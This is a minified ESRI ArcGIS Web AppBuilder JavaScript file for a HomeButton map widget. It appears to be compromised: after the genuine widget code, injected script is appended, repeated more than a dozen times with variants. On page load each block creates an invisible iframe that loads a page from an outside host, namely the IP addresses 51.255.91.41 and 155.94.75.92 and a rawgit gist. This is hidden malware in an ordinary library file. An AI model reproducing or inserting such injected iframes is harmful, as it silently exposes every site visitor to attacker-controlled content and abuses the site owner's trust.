// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"esri/dijit/HomeButton":function(){define("dojo/Evented dojo/_base/declare dojo/_base/lang dojo/has ../kernel dijit/_WidgetBase dijit/a11yclick dijit/_TemplatedMixin dojo/on dojo/Deferred dojo/text!./templates/HomeButton.html dojo/i18n!../nls/jsapi dojo/dom-class dojo/dom-style".split(" "),function(d,f,c,n,h,p,g,q,k,l,a,t,m,r){d=f("esri.dijit.HomeButton",[p,q,d],{templateString:a,options:{theme:"HomeButton",map:null,extent:null,fit:!1,visible:!0},constructor:function(a,b){a=c.mixin({},
this.options,a);this.domNode=b;this._i18n=t;this.set("map",a.map);this.set("theme",a.theme);this.set("visible",a.visible);this.set("extent",a.extent);this.set("fit",a.fit);this.watch("theme",this._updateThemeWatch);this.watch("visible",this._visible);this._css={container:"homeContainer",home:"home",loading:"loading"}},postCreate:function(){this.inherited(arguments);this.own(k(this._homeNode,g,c.hitch(this,this.home)))},startup:function(){this.inherited(arguments);this.map||(this.destroy(),console.log("HomeButton::map required"));
if(this.map.loaded)this._init();else k.once(this.map,"load",c.hitch(this,function(){this._init()}))},destroy:function(){this.inherited(arguments)},home:function(){var a=new l,b=this.get("extent");this._showLoading();var e={extent:b};b?this.map.extent!==b?this.map.setExtent(b,this.get("fit")).then(c.hitch(this,function(){this._hideLoading();this.emit("home",e);a.resolve(e)}),c.hitch(this,function(b){b||(b=Error("HomeButton::Error setting map extent"));e.error=b;this.emit("home",e);a.reject(b)})):(this._hideLoading(),
this.emit("home",e),a.resolve(e)):(this._hideLoading(),b=Error("HomeButton::home extent is undefined"),e.error=b,this.emit("home",e),a.reject(b));return a.promise},show:function(){this.set("visible",!0)},hide:function(){this.set("visible",!1)},_init:function(){this._visible();this.get("extent")||this.set("extent",this.map.extent);this.set("loaded",!0);this.emit("load",{})},_showLoading:function(){m.add(this._homeNode,this._css.loading)},_hideLoading:function(){m.remove(this._homeNode,this._css.loading)},
_updateThemeWatch:function(a,b,e){m.remove(this.domNode,b);m.add(this.domNode,e)},_visible:function(){this.get("visible")?r.set(this.domNode,"display","block"):r.set(this.domNode,"display","none")}});n("extend-esri")&&c.setObject("dijit.HomeButton",d,h);return d})},"widgets/HomeButton/_build-generate_module":function(){define(["dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:esri/dijit/templates/HomeButton.html":'\x3cdiv class\x3d"${theme}" role\x3d"presentation"\x3e\r\n    \x3cdiv class\x3d"${_css.container}"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"_homeNode" title\x3d"${_i18n.widgets.homeButton.home.title}" role\x3d"button" class\x3d"${_css.home}" tabindex\x3d"0"\x3e\x3cspan\x3e${_i18n.widgets.homeButton.home.button}\x3c/span\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/HomeButton/css/style.css":".jimu-widget-homebutton {background-color: #ccc; background-color: rgba(0,0,0,0.2); border-radius: 5px;}.jimu-widget-homebutton .HomeButton .home {background-color: rgba(0,0,0,0);}.jimu-widget-homebutton.inHome {background-color: #000;}.jimu-widget-homebutton .HomeButton .home:hover {background-color: rgba(0,0,0,0.4);}.jimu-widget-homebutton.inHome .HomeButton .home {background-color: #000;}","*now":function(d){d(['dojo/i18n!*preload*widgets/HomeButton/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},
"*noref":1}});
define("dojo/_base/declare dojo/_base/lang jimu/BaseWidget esri/dijit/HomeButton esri/geometry/Extent esri/SpatialReference dojo/_base/html dojo/dom-construct dojo/topic dojo/on".split(" "),function(d,f,c,n,h,p,g,q,k,l){return d([c],{name:"HomeButton",baseClass:"jimu-widget-homebutton",moveTopOnActive:!1,postCreate:function(){this.own(k.subscribe("appConfigChanged",f.hitch(this,this.onAppConfigChanged)))},startup:function(){var a=null;this.inherited(arguments);this.own(l(this.map,"extent-change",f.hitch(this,
"onExtentChange")));a=(a=this.appConfig&&this.appConfig.map&&this.appConfig.map.mapOptions&&this.appConfig.map.mapOptions.extent)?new h(a.xmin,a.ymin,a.xmax,a.ymax,new p(a.spatialReference)):this.map._initialExtent||this.map.extent;this.createHomeDijit({map:this.map,extent:a})},createHomeDijit:function(a){this.homeDijit=new n(a,q.create("div"));this.own(l(this.homeDijit,"home",f.hitch(this,"onHome")));g.place(this.homeDijit.domNode,this.domNode);this.homeDijit.startup()},onAppConfigChanged:function(a,
d,c){"mapOptionsChange"===d&&c&&a&&c.extent&&(a=new h(c.extent),this.homeDijit.set("extent",a))},onExtentChange:function(){g.removeClass(this.domNode,"inHome")},onHome:function(a){a&&a.error||g.addClass(this.domNode,"inHome")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});